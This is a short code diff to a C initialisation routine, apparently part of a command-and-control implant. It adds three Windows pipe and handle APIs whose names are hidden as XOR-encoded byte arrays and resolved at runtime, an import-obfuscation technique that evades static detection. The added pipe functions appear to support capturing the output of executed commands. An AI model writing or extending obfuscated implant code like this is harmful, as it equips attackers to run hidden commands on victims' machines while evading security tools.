@@ -253,6 +253,9 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_WakeConditionVariable[] = {13, 59, 49, 63, 25, 53, 52, 62, 51, 46, 51, 53, 52, 12, 59, 40, 51, 59, 56, 54, 63};
   static const unsigned char enc_GetComputerNameA[] = {29, 63, 46, 25, 53, 55, 42, 47, 46, 63, 40, 20, 59, 55, 63, 27};
   static const unsigned char enc_GetNativeSystemInfo[] = {29, 63, 46, 20, 59, 46, 51, 44, 63, 9, 35, 41, 46, 63, 55, 19, 52, 60, 53};
+  static const unsigned char enc_CreatePipe[] = {25, 40, 63, 59, 46, 63, 10, 51, 42, 63};
+  static const unsigned char enc_PeekNamedPipe[] = {10, 63, 63, 49, 4, 59, 55, 63, 62, 10, 51, 42, 63};
+  static const unsigned char enc_SetHandleInformation[] = {9, 63, 46, 18, 59, 52, 62, 54, 63, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52};
 
   /* ntdll functions */
   static const unsigned char enc_ntdll_dll[] = {52, 46, 62, 54, 54, 116, 62, 54, 54};
@@ -494,6 +497,9 @@ void c2t_win32_api_init(void) {
   LOAD_API(hKernel32, WakeConditionVariable, enc_WakeConditionVariable);
   LOAD_API(hKernel32, GetComputerNameA, enc_GetComputerNameA);
   LOAD_API(hKernel32, GetNativeSystemInfo, enc_GetNativeSystemInfo);
+  LOAD_API(hKernel32, CreatePipe, enc_CreatePipe);
+  LOAD_API(hKernel32, PeekNamedPipe, enc_PeekNamedPipe);
+  LOAD_API(hKernel32, SetHandleInformation, enc_SetHandleInformation);
   LOAD_API(hKernel32, SetDefaultDllDirectories, enc_SetDefaultDllDirectories);
 
   if (g_c2t_win32.SetDefaultDllDirectories) {
